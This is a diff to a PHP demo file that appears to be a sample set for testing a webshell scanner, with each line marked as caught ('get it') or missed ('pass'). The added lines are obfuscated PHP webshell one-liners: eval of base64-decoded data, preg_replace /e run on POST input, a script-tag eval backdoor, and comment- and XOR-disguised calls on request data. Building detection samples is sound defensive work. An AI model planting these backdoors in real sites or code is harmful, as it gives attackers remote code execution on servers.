@@ -13,7 +13,7 @@
  * @license         http://www.fsf.org/copyleft/gpl.html GNU public license
  * @author          CFC4N <cfc4n@cnxct.com>
  * @package         demo
- * @version         $Id$
+ * @version         $Id: 1.php 29 2014-03-06 12:55:31Z cfc4n $
  */
 
 $str = 'base64_decode';
@@ -58,4 +58,46 @@ $b[0]('ipconfig');    //get is
 $b{0}('ipconfig');    //get is
 echo $b[0];    //pass
 echo $b{0};    //pass
+
+${@func1}();    //get it
+$$a();    //get it
+${true?$func1:$func2}();    //get it
+${2+1}();    //get it
+${2+1};    //pass
+${@func};    //pass
+
+
+@preg_replace("/[pageerror]/e",$_POST['error'],"cfc");    //get it
+header('HTTP/1.1 404 Not Found');
+
+preg_replace('\'a\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\'theCode\']))','a');    //get it
+
+if(reset($a) == '10' && count($a) == 9) {
+    eval(base64_decode(str_replace(" ", "+", implode(array_slice($a, 6)))));        //get it
+}
+
+($_=@$_GET[2]).@$_($_POST[1]);        //get it
+
+$_="";
+$_[+""]='';
+$_="$_"."";
+$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");        //get it
+
+$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
+$hh("/[discuz]/e",$_POST['h'],"Access");        //get it
+${'_'.$_}['_'](${'_'.$_}['__']);    //get it
 ?>
+<script language="php">@eval($_POST[sb])</script>        //get it
+ 
+<?php
+@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";
+@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";
+@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}
+[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);    //get it
+
+$_="";
+$_[+""]='';
+$_="$_"."";
+$_=($_[+""]|"0x06").($_[+""]|"0x05").($_[+""]^"0x15");        //get it
+?>
+<?=${'_'.$_}['_'](${'_'.$_}['__']);?>
